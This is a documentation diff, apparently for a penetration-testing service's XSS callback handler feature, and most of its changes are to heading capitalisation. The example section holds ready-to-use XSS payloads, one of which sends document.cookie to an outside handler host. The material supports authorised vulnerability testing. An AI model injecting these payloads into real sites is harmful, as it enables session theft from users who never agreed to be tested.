@@ -7,64 +7,64 @@ description: "Capture and analyze cross-site scripting payload executions"
 
 XSS Handlers provide callback endpoints for capturing XSS payload executions, helping you validate and demonstrate XSS vulnerabilities.
 
-## What It Does
+## What it does
 
 <CardGroup cols={2}>
-  <Card title="Callback Capture" icon="bullseye">
+  <Card title="Callback capture" icon="bullseye">
     Receive XSS execution callbacks
   </Card>
-  <Card title="Data Collection" icon="database">
+  <Card title="Data collection" icon="database">
     Capture cookies and data
   </Card>
-  <Card title="Proof Generation" icon="certificate">
+  <Card title="Proof generation" icon="certificate">
     Generate exploitation evidence
   </Card>
-  <Card title="Real-time Alerts" icon="bell">
+  <Card title="Real-time alerts" icon="bell">
     Instant notification of hits
   </Card>
 </CardGroup>
 
-## How to Use
+## How to use
 
 <Steps>
-  <Step title="Create Handler">
+  <Step title="Create handler">
     Generate a unique handler endpoint.
   </Step>
-  <Step title="Craft Payload">
+  <Step title="Craft payload">
     Build an XSS payload using the handler URL.
   </Step>
-  <Step title="Inject Payload">
+  <Step title="Inject payload">
     Test the payload in the target application.
   </Step>
-  <Step title="Monitor Results">
+  <Step title="Monitor results">
     View callbacks when payloads execute.
   </Step>
 </Steps>
 
-## Handler Types
+## Handler types
 
-| Type | Purpose | Data Captured |
+| Type | Purpose | Data captured |
 |------|---------|---------------|
 | Basic | Simple execution proof | Timestamp, source |
 | Cookie | Cookie exfiltration | Cookies, headers |
 | DOM | DOM data capture | Page content, localStorage |
 | Screenshot | Visual capture | Page screenshot |
 
-## Example Payloads
+## Example payloads
 
-### Basic Callback
+### Basic callback
 
 ```javascript
 <script>new Image().src="https://handler.pentest-tools.com/h/YOUR_ID"</script>
 ```
 
-### Cookie Capture
+### Cookie capture
 
 ```javascript
 <script>new Image().src="https://handler.pentest-tools.com/h/YOUR_ID?c="+document.cookie</script>
 ```
 
-## Captured Data
+## Captured data
 
 For each callback:
 - Timestamp
@@ -78,7 +78,7 @@ For each callback:
 XSS handlers capture real data. Handle captured cookies and session data responsibly and delete after testing.
 </Warning>
 
-## Use Cases
+## Use cases
 
 - Validate reflected XSS
 - Prove stored XSS impact
@@ -89,7 +89,6 @@ XSS handlers capture real data. Handle captured cookies and session data respons
 Use XSS handlers to provide undeniable proof of exploitation in your security reports.
 </Tip>
 
-## Related Tools
+## Related tools
 
-- [XSS Scanner](/tools/xss-scanner)
-- [Website Vulnerability Scanner](/tools/website-vulnerability-scanner)
+- [Website Vulnerability Scanner](/tools/website-vulnerability-scanner) — Comprehensive web app testing
